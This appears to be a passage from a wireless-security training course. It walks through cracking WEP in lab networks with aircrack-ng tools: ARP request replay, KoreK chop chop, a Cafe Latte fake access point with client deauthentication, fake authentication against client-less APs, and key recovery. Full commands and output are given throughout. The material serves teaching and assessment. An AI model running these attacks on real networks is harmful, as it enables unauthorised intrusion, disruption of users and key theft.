        0x0010:  ffff ffff ffff 8001 369f d800 5899 17e1  ........6...X...
        0x0020:  4841 7fed f893 7419 9d0f d368 9341 f130  HA...t....h.A.0
        0x0030:  c021 668c 9f07 a5ec 15be 3583 df2c b474  .!f.......5..,.t
        0x0040:  cf84 1ddb....

Use this packet ? y

Saving chosen packet in replay_src-0805-192042.cap
You should also start airodump-ng to capture replies.

Sent 1400 packets...(499 pps)

```

As this process runs, back in the `airodump-ng` output we can notice that the `Frames` count for the connected station increases. This is a positive sign that many IVs are being generated.

```shell
 CH  1 ][ Elapsed: 2 mins ][ 2024-08-05 20:20

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 A2:BD:32:EB:21:15  -47   0     1584    23983  923   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 A2:BD:32:EB:21:15  42:E9:11:39:88:AE  -48   11 - 1      0    36015

```

To further accelerate the IV generation process, we can launch an ARP request replay attack in a new terminal. This approach will enhance the rate at which new IVs are created, helping to expedite the overall process.

```shell
sudo aireplay-ng -3 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE
19:21:47  Waiting for beacon frame (BSSID: A2:BD:32:EB:21:15) on channel 1
Saving ARP requests in replay_arp-0805-192147.cap
You should also start airodump-ng to capture replies.
Read 133226 packets (got 30681 ARP requests and 0 ACKs), sent 27992 packets...(499 pps)

```

Once enough packets have been gathered, we can use aircrack-ng to crack the WEP key from the captured IVs stored in the `WEP-01.cap` file:

```shell
aircrack-ng -b A2:BD:32:EB:21:15 WEP-01.cap

Got 85311 out of 85000 IVs
Starting PTW attack with 85311 ivs.

                     KEY FOUND! [ 33:44:55:22:11 ]

Reading Decrypted correctly: 100%
Opening WEP-01.cap
Read 306522 packets.

```


# Korek Chop Chop Attack

* * *

Not all access points (APs) are equal. During an assessment, we may find some are more vulnerable to fragmentation than others. As an alternative, we can employ the [Korek Chop Chop Attack](https://www.aircrack-ng.org/doku.php?id=korek_chopchop) to similarly capture a packet and retrieve the 1500 bytes of PRGA. Known technically as an `Inverse Arbaugh` attack, chop chop uses inductive reasoning to decrypt the packet without needing the key.

This is achieved by abusing the Integrity Check Value (ICV) in WEP. If we recall, the ICV ensures the integrity of the transmitted message. In the case of WEP, the CRC32 algorithm is used to calculate this value; if the ICV of a packet is not valid, it will be dropped by the access point (AP) upon receipt. This seemingly benign interaction creates an opportunity for attackers.

The attack works like this: after capturing a legitimate packet, the last byte of the encrypted message is removed and assigned a value (from 0-255) that we guess, starting at zero. A series of [calculations](https://www.aircrack-ng.org/doku.php?id=chopchoptheory) is performed to determine the ICV of the truncated packet, which has a mathematical relationship to the value of the missing byte. This new packet is sent into the network as we await the AP's response. If the packet is dropped, we guess a different number and try again. If the packet isn't dropped, it means our guess was correct, thus revealing the true value of the byte. We then "chop off" the next byte and repeat the process. As the packet is decrypted byte by byte, we are able to recover the PRGA simultaneously.

With the resulting keystream data (.xor file), we are able to craft and encrypt packets that look legitimate within the network. This allows us to subsequently perform the ARP request replay attack.

* * *

We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.

#### Enabling Monitor Mode

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

After setting the interface into monitor mode, we can verify the change by using the `iwconfig` utility.

```shell
iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

#### Performing the Attack

To begin, we scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the location to save the capture file with the `-w` argument.

```shell
airodump-ng wlan0mon -c 1 -w WEP

21:38:45  Created capture file "WEP-01.cap".
 CH  1 ][ Elapsed: 37 mins ][ 2024-08-05 22:15

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 C8:D1:4D:EA:21:A6  -47 100    21573   116394    0   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 C8:D1:4D:EA:21:A6  7E:8D:FC:DD:D7:2C  -29    1 - 5      0      85

```

Next, we initiate the `KoreK chop chop` attack in a second terminal. The source MAC address used should be capable of associating with the network. If we need to conduct the attack without authentication and association, there are two options: either omit the `-h` flag (though this can result in dropped packets), or specify the MAC address of an already connected station, which tends to be more reliable. The `-4` option in `aireplay-ng` is used for the KoreK chop chop attack.

Similar to fragmentation attacks, we want to capture a packet originating from a connected station and destined for the AP. Once a valid packet is found, we approve the selection and start the attack, retrieving the PRGA keystream bit by bit.

```shell
aireplay-ng -4 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C
22:09:49  Waiting for beacon frame (BSSID: C8:D1:4D:EA:21:A6) on channel 1

        Size: 100, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  C8:D1:4D:EA:21:A6
          Dest. MAC  =  C8:D1:4D:EA:21:A6
         Source MAC  =  7E:8D:FC:DD:D7:2C

        0x0000:  0841 0201 d8d6 3deb 29d5 7e8d fcdd d72c  .A....=.).~....,
        0x0010:  d8d6 3deb 29d5 3066 daa0 0a00 3cf2 9b22  ..=.).0f....<.."
        0x0020:  140f 1281 b336 3dc3 7697 157a 88d9 2460  .....6=.v..z..$`
        0x0030:  ed13 410b bea6 9b5d ce96 add6 75fb a0f8  ..A....]....u...
        0x0040:  6878 7ea3 d70a 425f 2c14 a71a 2715 75a6  hx~...B_,...'.u.
        0x0050:  b9ee c1d2 4e19 ae2b e93c c9ab fc28 959f  ....N..+.<...(..
        0x0060:  9a1d 597d                                ..Y}

Use this packet ? y

Saving chosen packet in replay_src-0805-220949.cap

Offset   87 ( 0% done) | xor = 13 | pt = 53 |   83 frames written in  1419ms
Offset   86 ( 1% done) | xor = 64 | pt = B8 |   98 frames written in  1660ms
Offset   85 ( 3% done) | xor = 5D | pt = 0C |   80 frames written in  1360ms
Offset   84 ( 5% done) | xor = 64 | pt = F3 |    4 frames written in    67ms
Offset   83 ( 7% done) | xor = 7B | pt = 00 |   65 frames written in  1097ms
Offset   82 ( 9% done) | xor = 21 | pt = 00 |  219 frames written in  3717ms
Offset   81 (11% done) | xor = F0 | pt = 00 |   17 frames written in   286ms
Offset   80 (12% done) | xor = 44 | pt = 00 |  116 frames written in  1966ms
Offset   79 (14% done) | xor = 3C | pt = 8E |   37 frames written in   621ms
Offset   78 (16% done) | xor = 48 | pt = F7 |  190 frames written in  3206ms
Offset   77 (18% done) | xor = 4C | pt = 00 |  232 frames written in  3935ms
Offset   76 (20% done) | xor = B1 | pt = 85 |   56 frames written in   940ms
Offset   75 (22% done) | xor = 0B | pt = 02 |  159 frames written in  2686ms
Offset   74 (24% done) | xor = C0 | pt = 00 |    6 frames written in   102ms
Offset   73 (25% done) | xor = FB | pt = 00 |   60 frames written in  1030ms
Offset   72 (27% done) | xor = 98 | pt = 00 |  186 frames written in  3155ms
Offset   71 (29% done) | xor = 85 | pt = 00 |   95 frames written in  1622ms
Offset   70 (31% done) | xor = DA | pt = 00 |  167 frames written in  2817ms
Offset   69 (33% done) | xor = 0B | pt = 00 |   94 frames written in  1581ms
Offset   68 (35% done) | xor = 6E | pt = 00 |   19 frames written in   323ms
Offset   67 (37% done) | xor = F0 | pt = 00 |  225 frames written in  3800ms
Offset   66 (38% done) | xor = C4 | pt = 00 |  110 frames written in  1855ms
Offset   65 (40% done) | xor = 2B | pt = 00 |   43 frames written in   724ms
Offset   64 (42% done) | xor = 79 | pt = 00 |  116 frames written in  1958ms
Offset   63 (44% done) | xor = F6 | pt = 00 |  216 frames written in  3659ms
Offset   62 (46% done) | xor = A2 | pt = 00 |   39 frames written in   662ms
Offset   61 (48% done) | xor = 46 | pt = 02 |  107 frames written in  1808ms
Offset   60 (50% done) | xor = 0B | pt = FF |   97 frames written in  1639ms
Offset   59 (51% done) | xor = FB | pt = E1 |  125 frames written in  2121ms
Offset   58 (53% done) | xor = AA | pt = C4 |  239 frames written in  4060ms
Offset   57 (55% done) | xor = 05 | pt = 08 |   97 frames written in  1636ms
Offset   56 (57% done) | xor = CB | pt = A7 |  234 frames written in  3966ms
Offset   55 (59% done) | xor = 77 | pt = 7E |  247 frames written in  4179ms
Offset   54 (61% done) | xor = CB | pt = 0C |   17 frames written in   283ms
Offset   53 (62% done) | xor = 5A | pt = 40 |  223 frames written in  3776ms
Offset   52 (64% done) | xor = A4 | pt = 0D |  189 frames written in  3227ms
Offset   51 (66% done) | xor = 67 | pt = 00 |   67 frames written in  1137ms
Offset   50 (68% done) | xor = 11 | pt = 00 |  153 frames written in  2587ms
Offset   49 (70% done) | xor = 53 | pt = 00 |  149 frames written in  2531ms
Offset   48 (72% done) | xor = 69 | pt = 00 |   85 frames written in  1438ms
Offset   47 (74% done) | xor = 19 | pt = 00 |   40 frames written in   674ms
Offset   46 (75% done) | xor = 05 | pt = 00 |  150 frames written in  2535ms
Offset   45 (77% done) | xor = 9C | pt = 80 |   36 frames written in   606ms
Offset   44 (79% done) | xor = 41 | pt = FE |  213 frames written in  3583ms
Offset   43 (81% done) | xor = 32 | pt = FF |  200 frames written in  3381ms
Offset   42 (83% done) | xor = 16 | pt = 3A |  192 frames written in  3257ms
Offset   41 (85% done) | xor = 49 | pt = 08 |  218 frames written in  3717ms
Offset   40 (87% done) | xor = 35 | pt = 00 |  136 frames written in  2316ms

Sent 946 packets, current guess: AE...

The AP appears to drop packets shorter than 40 bytes.
Enabling standard workaround:  IP header re-creation.

Saving plaintext in replay_dec-0805-221220.cap
Saving keystream in replay_dec-0805-221220.xor

Completed in 141s (0.44 bytes/s)

```

Once the attack is completed, we will have two files to work with to forge our ARP request.

```shell
ls

replay_dec-0805-221220.cap
replay_dec-0805-221220.xor

```

Now, analyze the decrypted packet to identify the source and destination IP addresses.

```shell
tcpdump -s 0 -n -e -r replay_dec-0805-221220.cap

reading from file replay_dec-0805-221220.cap, link-type IEEE802_11 (802.11), snapshot length 65535
22:12:20.091153 BSSID:c8:d1:4d:ea:21:a6 SA:7e:8d:fc:dd:d7:2c DA:c8:d1:4d:ea:21:a6 LLC, dsap SNAP (0xaa) Individual, ssap SNAP (0xaa) Command,
ctrl 0x03: oui Ethernet (0x000000), ethertype IPv4 (0x0800), length 60: 192.168.1.75.43748 > 192.168.1.1.443: Flags [S], seq 4053382319, win 6
4240, options [mss 1460,sackOK,TS val 4080146584 ecr 0,nop,wscale 7], length 0

```

After identifying the required IP addresses, we can forge an ARP request using `packetforge-ng`. In this command, we specify the access point's MAC address with `-a`, the station’s MAC address with `-h`, the access point’s IP address with `-k`, the station’s IP address with `-l`, the location and name of our PRGA file with `-y`, and finally, the output name for the forged ARP request capture file with `-w`.

```shell
packetforge-ng -0 -a C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C -k 192.168.1.1 -l 192.168.1.75 -y replay_dec-0805-221220.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap

```

Once the forged packet is saved as `forgedarp.cap`, we can inject it into the target network to generate initialization vectors (IVs). One common way to do this is by using [Interactive Packet Replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).

We do so by specifying the interactive packet replay mode with `-2`, the name and location of our forged packet with `-r`, the source MAC address to inject with `-h`, and our interface in monitor mode with `wlan0mon` as shown below.

```shell
aireplay-ng -2 -r forgedarp.cap -h 7E:8D:FC:DD:D7:2C wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  C8:D1:4D:EA:21:A6
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  7E:8D:FC:DD:D7:2C

        0x0000:  0841 0201 d8d6 3deb 29d5 7e8d fcdd d72c  .A....=.).~....,
        0x0010:  ffff ffff ffff 8001 daa0 0a00 3cf2 9b22  ............<.."
        0x0020:  140f 1287 f637 35ff dc9f 557b b652 d3ae  .....75...U{.R..
        0x0030:  fa97 80e8 7f8f 9a5c 6472 ac6d 44ca 1556  ......\dr.mD..V
        0x0040:  e423 69ca                                .#i.

Use this packet ? y

Saving chosen packet in replay_src-0805-221358.cap
You should also start airodump-ng to capture replies.

Sent 3503 packets...(500 pps)

```

As this process runs, back in the `airodump-ng` output we can notice that the **Frames** count for the connected station increases. This is a positive sign that many new IVs are being generated.

We can wait until enough packets have been generated before attempting to crack the WEP key. Additionally, to further accelerate the IV generation process, we can use an ARP request replay attack in a new terminal. This approach will expedite the overall process.

```shell
aireplay-ng -3 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C
22:14:47  Waiting for beacon frame (BSSID: C8:D1:4D:EA:21:A6) on channel 1
Saving ARP requests in replay_arp-0805-221447.cap
You should also start airodump-ng to capture replies.
Read 186176 packets (got 69052 ARP requests and 0 ACKs), sent 26781 packets...(499 pps)

```

Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured Initialization Vectors (IVs) stored in the `WEP-01.cap` file.

```shell
aircrack-ng -b C8:D1:4D:EA:21:A6 WEP-01.cap

Reading packets, please wait...
Opening WEP-01.cap
Read 251698 packets.

1 potential targets                                     Got 116410 out of 115000 IVs
Starting PTW attack with 116410 ivs.

                         KEY FOUND! [ 33:44:55:22:11 ]

Attack Decrypted correctly: 100% captured ivs.

```


# The Cafe Latte Attack

* * *

The [Cafe Latte](https://www.aircrack-ng.org/doku.php?id=cafe-latte) attack exploits how WEP clients handle reauthentication requests, enabling attackers to generate traffic and capture enough IVs to crack the WEP key without requiring traffic from the AP.

Both `fragmentation` and `Korek chop chop` attacks rely on traffic being generated in the network, such as clients browsing the internet, to capture and forge packets. Similarly, the `ARP request replay` attack requires valid ARP traffic in the network. If no traffic is being generated by clients, these attacks cannot be performed. However, in such cases, the `Cafe Latte` attack can directly target the clients instead.

Essentially, the Cafe Latte attack is a variation of an ARP Request Replay attack aimed at connected clients. It can be likened to an evil-twin attack for WEP. To execute it, a fake access point with the same BSSID as the target network is created, running in WEP mode, and clients are deauthenticated from the target network, forcing them to reconnect to the fake access point. This setup generates the desired ARP packets, which are replayed repeatedly using the ARP request replay attack to collect enough initialization vectors (IVs) to crack the WEP key. Four terminals will be required to execute this attack successfully.

* * *

We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.

#### Enabling Monitor Mode

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

We can test to see if our interface is in monitor mode with the `iwconfig` utility.

```shell
iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off

```

* * *

#### Performing the Attack

To begin, we scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the location to save the capture file with the `-w` argument.

```shell
airodump-ng wlan0mon -c 1 -w WEP

09:49:22  Created capture file "WEP-01.cap".

 CH  1 ][ Elapsed: 3 mins ][ 2024-08-06 09:53

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:D1:AC:E1:21:D1  -29   0     5011     8132   78   1   54   WEP  WEP    OPN  HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:D1:AC:E1:21:D1  B6:1F:98:CB:10:78  -29    1 - 1      0     9404         HackTheWifi

```

In a second terminal, we can start the `Cafe Latte` attack using `aireplay-ng`. We specify the Cafe Latte attack mode with `-6`, the BSSID of the target AP with `-b`, and the client MAC address with `-h`. This will listen for a station to connect, and replay any captured ARP requests to the client.

```shell
aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether B6:1F:98:CB:10:78
Saving ARP requests in replay_arp-0806-094956.cap
You should also start airodump-ng to capture replies.
Read 99 packets (got 0 ARP requests), sent 0 packets...

```

Once the Cafe Latte listener is running, the next step is to launch a fake access point in a third terminal. The ESSID and BSSID of this access point must match those of the target network to deceive deauthenticated clients into reconnecting and sharing their ARP requests. The `airbase-ng` tool is used to create this fake access point, with identical BSSID and ESSID to the target, operating on the same channel. Use the `-a` flag to specify the BSSID of the target AP, `-e` to set the ESSID, `-c` to select the channel, `-L` to initiate the Cafe Latte attack mode, and `-W 1` to enable WEP mode. For a complete list of command options and arguments for `airbase-ng`, refer to the documentation [here](https://www.aircrack-ng.org/doku.php?id=airbase-ng).

```shell
airbase-ng -c 1 -a B2:D1:AC:E1:21:D1  -e "HackTheWifi" wlan0mon -W 1 -L

09:50:40  Created tap interface at0
09:50:40  Trying to set MTU on at0 to 1500
09:50:40  Trying to set MTU on wlan0mon to 1800
09:50:40  Access Point with BSSID B2:D1:AC:E1:21:D1 started.

```

This will listen for a station to connect and replay any captured ARP requests to the client. This setup will deauthenticate deauthenticated clients into reconnecting to our network, allowing us to capture their ARP requests for further analysis and attack.

Once our access point is up, we can deauthenticate the station in a fourth terminal using `aireplay-ng` to force the clients to reconnect to our fake access point.

```shell
aireplay-ng -0 10 -a B2:D1:AC:E1:21:D1 -c B6:1F:98:CB:10:78  wlan0mon

09:51:22  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
09:51:23  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:24  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:25  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:27  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:29  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:30  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:31  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:32  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:34  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]
09:51:35  Sending 64 directed DeAuth (code 7). STMAC: [B6:1F:98:CB:10:78] [ 0| 0 ACKs]

```

When the target station is deauthenticated, we should see changes in our second and third terminal that are indicative of our attack succeeding.

```shell
airbase-ng -c 1 -a B2:D1:AC:E1:21:D1  -e "HackTheWifi" wlan0mon -W 1 -L

09:50:40  Created tap interface at0
09:50:40  Trying to set MTU on at0 to 1500
09:50:40  Trying to set MTU on wlan0mon to 1800
09:50:40  Access Point with BSSID B2:D1:AC:E1:21:D1 started.
09:50:53  Starting Caffe-Latte attack against B6:1F:98:CB:10:78 at 100 pps.
09:51:23  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:35  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:35  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:35  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"
09:51:55  Client B6:1F:98:CB:10:78 associated (WEP) to ESSID: "HackTheWifi"

```

```shell
aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether B6:1F:98:CB:10:78
Saving ARP requests in replay_arp-0806-094956.cap
You should also start airodump-ng to capture replies.
Notice: got a deauth/disassoc packet. Is the source MAC associated ?
Notice: got a deauth/disassoc packet. Is the source MAC associated ?
Read 171321 packets (9269 ARPs, 0 ACKs), sent 84553 packets...(479 pps)

```

Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured initialization vectors (IVs) stored in the WEP-01.cap file.

```shell
aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap

Reading packets, please wait...
Opening WEP-01.cap
Read 195576 packets.

1 potential targets
Got 97822 out of 95000 IVs
Starting PTW attack with 97822 ivs.
                     KEY FOUND! [ 33:44:55:22:11 ]
Attack Decrypted correctly: 100% captured ivs.

```

* * *

While executing the Cafe Latte attack, if no ARP packets are generated, it is recommended to rerun the deauthentication attack using "aireplay-ng" then immediately execute the "airbase-ng" command.

* * *

In the following section, we will explore how to attack a WEP network when no clients are connected and no traffic is being generated. This will involve using `aireplay-ng` to fake authenticate with the access point, thereby generating traffic, followed by utilizing fragmentation or Korek chop chop attacks to forge packets and generate ARP requests.


# Attacking WEP Access Points Without Clients

* * *

Suppose our target network does not have any wireless clients connected and there are no ARP requests coming from any Ethernet-connected stations. In this scenario, we can perform a special `Fragmentation` or `KoreK chop chop` attack in combination with [fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication). It's important to note that while this method works on some networks, it is not universally effective, and ultimately depends on whether the network is vulnerable to fake authentication or not.

We will need three terminals for this attack. In the first terminal, we scan the target network and capture its communications using `airodump-ng`.

```shell
sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP

 CH  1 ][ Elapsed: 4 mins ][ 2024-08-10 19:01

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 60:38:E0:71:E9:DC  -47 100     2825       44    0   3   11   WEP  WEP         Virt-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

```

Once this is running, in our second terminal we will begin packet crafting attempts. This involves using our interface's MAC address to authenticate with the access point. We employ the following command, specifying fake authentication with `-1`, the re-association interval with `1000`, the ESSID of the network with `-e`, the BSSID with `-a`, our MAC address with `-h`, and the keep-alive request interval with `-q`. Additionally, we use `-o 1` to send only one set of packets at a time.

```shell
aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

Sending Authentication Request
Authentication successful
Sending Association Request
Association successful :-)

```

Note: We supply our own interface's MAC address (00:c0:ca:98:3e:e0) as the attacker.

In the `airodump-ng` output, we can confirm that fake authentication was successful as our MAC address now appears as a client connected to the AP.

```shell
sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP

 CH  1 ][ Elapsed: 4 mins ][ 2024-08-10 19:01

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 60:38:E0:71:E9:DC  -47 100     2825       44    0   3   11   WEP  WEP         Virt-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 60:38:E0:71:E9:DC  00:c0:ca:98:3e:e0  -29    0 - 1      0    13847         Virt-Corp


```

Then, in a third terminal, we initiate either a fragmentation or KoreK chop chop attack. To start a KoreK chop chop attack, we use the following command, specifying the access point's BSSID with `-b` and our interface's MAC address with `-h`.

```shell
aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon

Read 667 packets...

        Size: 392, FromDS: 1, ToDS: 0 (WEP)

              BSSID  =  60:38:E0:71:E9:DC
          Dest. MAC  =  00:c0:ca:98:3e:e0
         Source MAC  =  60:38:E0:71:E9:DC

Use this packet ? y

Offset  389 ( 0% done) | xor = 9A | pt = AF |   58 frames written in  1067ms
Offset  388 ( 0% done) | xor = B4 | pt = AB |  178 frames written in  3212ms
Offset  387 ( 1% done) | xor = F8 | pt = CB |  244 frames written in  4395ms
<snip>
Saving plaintext in replay_dec-1229-160018.cap
Saving keystream in replay_dec-1229-160018.xor

```

Once we have successfully captured the PRGA keystream to a `.xor` file, we will use `packetforge-ng` to forge a packet and inject it into the network with no stations. We do so with the following command, specifying the access point MAC with `-a`, our associated interface MAC with `-h`, our guessed source IP with `-l`, our guessed destination IP with `-k`, our replay file with `-y`, and write destination with `-w`. If we do not know the IP, we could just use `255.255.255.0` or `255.255.255.255`.

```shell
packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-1229-160018.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap

```

Now that we have a forged ARP packet, we can inject it back into the network. We do so with the following command:

```shell
aireplay-ng -2 -r forgedarp.cap wlan0mon

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  60:38:E0:71:E9:DC
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  00:c0:ca:98:3e:e0
Use this packet ? y

```

Once this is going, we wait several moments as the initialization vectors generate. We could also start an ARP request replay attack to speed things up, as we have done previously. Once enough traffic is generated, we can attempt to crack the key with `aircrack-ng`, using the default PTW method:

```shell
sudo aircrack-ng -b 60:38:E0:71:E9:DC WEP-01.cap

                                                 Aircrack-ng 1.7

                                   [00:00:00] Tested 2 keys (got 26962 IVs)

   KB    depth   byte(vote)
    0    0/  1   26(36352) C7(35328) 2B(34560) 6D(33024) B2(32512) 06(32000) 28(32000) D7(32000)
    1    0/  1   27(37888) 4B(35328) BD(33536) 77(32768) 26(32512) AE(32512) 68(32000) 87(32000)
    2    0/  1   F6(40448) E2(34304) 2B(34048) 89(34048) 31(33536) 99(33280) 9F(33280) DE(33280)
    3    0/  1   85(35072) 7D(34304) 0D(34048) C1(33536) 55(32256) F7(32000) 36(31744) 79(31744)
    4    0/  1   97(34816) 1C(34048) F3(34048) AD(33280) 61(33024) 3C(32768) 84(32768) 02(32512)

                         KEY FOUND! [ 26:27:F6:85:97 ]
        Decrypted correctly: 100%

```

It is worth noting that fake authentication is mostly only effective with older routers, as newer routers do not generate broadcast requests when connected via fake authentication.

Attacks on the access point can be done in many different ways, with the typical aim of retrieving the PRGA keystream and key. In the next section, we will explore advanced WEP cracking techniques.


# Additional WEP Cracking

* * *

In this section, we will cover additional methods of cracking WEP. First, we’ll expand on the classic approach of using captured initialization vectors (IVs) from `airodump-ng`. Then, we’ll explore how to perform a mostly-offline dictionary attack with Python, requiring minimal captured data. The script will use [airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng) and a password list to perform a brute-force attack, ultimately revealing the WEP key. These methods reinforce just how fragile WEP encryption is, and why it’s essential to move towards more secure protocols.

* * *

#### Aircrack-ng Benchmark

By now, we know `aircrack-ng` is a powerful tool designed for network security testing, capable of cracking WEP and WPA/WPA2 networks that use pre-shared keys or PMKID. As an offline attack tool, it works with captured packets and does not need direct interaction with any Wi-Fi device.

Prior to commencing password/key cracking with aircrack-ng, it may be beneficial to assess the benchmark of the host system, so we may ensure its ability to execute brute-force attacks effectively. For this, we will use the built-in benchmark mode, supplying the `-S` option to test CPU performance.

```shell
aircrack-ng -S

1628.101 k/s

```

The above output estimates that our CPU can crack approximately 1,628.101 passphrases per second. Since `aircrack-ng` fully utilizes the CPU, the cracking speed can decrease significantly if other demanding tasks are also running on the system.

* * *

#### Korek WEP Cracking

As we've seen in previous sections, `aircrack-ng` is capable of recovering the WEP key once a sufficient number of encrypted packets have been captured using `airodump-ng`. The `-w` option in `airodump-ng` saves the traffic into a `.cap` file. However, it is also possible to save only the captured initialization vectors using the `--ivs` option. Once enough IVs are captured, we can utilize the `-K` option in aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.

```shell
aircrack-ng -K HTB.ivs

Reading packets, please wait...
Opening HTB.ivs
Read 567298 packets.

   #  BSSID              ESSID                     Encryption

   1  B1:A3:94:21:7F:1A                            WEP (0 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening HTB.ivs
Read 567298 packets.

1 potential targets

                                             Aircrack-ng 1.6

                               [00:00:17] Tested 1741 keys (got 566693 IVs)

   KB    depth   byte(vote)
    0    0/  1   AB(  50) 11(  20) 71(  20) 0D(  12) 10(  12) 68(  12) 84(  12) 0A(   9)
    1    1/  2   C7(  31) BD(  18) F8(  17) E6(  16) 35(  15) 7A(  13) 7F(  13) 81(  13)
    2    0/  3   7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 86(  12) 1B(  10) BF(  10)
